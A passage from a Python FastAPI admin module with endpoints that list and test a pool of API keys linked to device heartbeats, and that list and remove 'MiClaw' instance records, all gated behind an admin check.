                    key_test = {}
                    if code in cached:
                        c = cached[code]
                        key_test = {"ok": c.get("status") == "working", "msg": c.get("error_msg", ""), "tested_at": c.get("tested_at", 0), "models": []}
                    tokens.append({
                        "code": code, "qq": hb.get("qq", ""), "model": hb.get("model", ""), "brand": hb.get("brand", ""),
                        "api_key": keys.get("api_key", ""), "api_base_url": keys.get("api_base_url", ""),
                        "model_name": keys.get("model_name", ""), "provider_id": keys.get("provider_id", ""),
                        "online": bool(ts and time.time() - ts < 600), "key_test": key_test,
                    })
            except Exception:
                pass
    tokens.sort(key=lambda x: (not x["online"], x["code"]))
    return {"tokens": tokens, "total": len(tokens)}

@router.post("/api/token-pool/test-key")
def api_test_token_key(code: str = "", _: bool = Depends(require_admin)):
    if not code: return {"ok": False, "msg": "missing code"}
    from app.token_pool import get_pool
    pool = get_pool(); pool._load()
    for pk in pool.keys:
        if pk.code == code:
            ok = pool.test_key(pk); pool._save()
            return {"ok": ok, "code": code, "msg": "" if ok else pk.error_msg}
    return {"ok": False, "msg": "not found", "code": code}

@router.post("/api/token-pool/test-all")
def api_test_all_tokens(_: bool = Depends(require_admin)):
    from app.token_pool import get_pool
    pool = get_pool(); pool._load()
    total = len(pool.keys)
    if total == 0: return {"ok": True, "total": 0, "working": 0, "failed": 0}
    ok = sum(1 for pk in pool.keys if pool.test_key(pk))
    pool._save()
    return {"ok": True, "total": total, "working": ok, "failed": total - ok}

# ─── MiClaw实例管理 ──────────────────────────────
@router.get("/api/miclaw-instances")
def api_miclaw_instances(_: bool = Depends(require_admin)):
    _cleanup_inst()  # 打开页面时清理超过2小时未登录的实例
    inst_file = DATA_DIR / "miclaw_instances.json"
    instances = []
    if inst_file.exists():
        data = _load(inst_file, {})
        now = time.time()
        for k, v in data.items():
            created_at = v.get("created_at", now)
            instances.append({
                "id": k,
                "user_id": v.get("user_id", ""),
                "device_id": v.get("device_id", ""),
                "status": v.get("status", ""),
                "model": v.get("model", ""),
                "tokens_used": v.get("tokens_used", 0),
                "last_error": v.get("last_error", ""),
                "created_at": created_at,
                "alive_minutes": int((now - created_at) / 60) if isinstance(created_at, (int, float)) else 0,
            })
    instances.sort(key=lambda x: x["created_at"], reverse=True)
    return {"instances": instances, "total": len(instances)}

@router.post("/api/miclaw-instances/{iid}/destroy")
def api_destroy_instance(iid: str, _: bool = Depends(require_admin)):
    inst_file = DATA_DIR / "miclaw_instances.json"
    data = _load(inst_file, {})
    if iid in data:
        del data[iid]
        _save(inst_file, data)
        return {"ok": True, "msg": "实例记录已移除"}
    return {"ok": False, "msg": "实例不存在"}
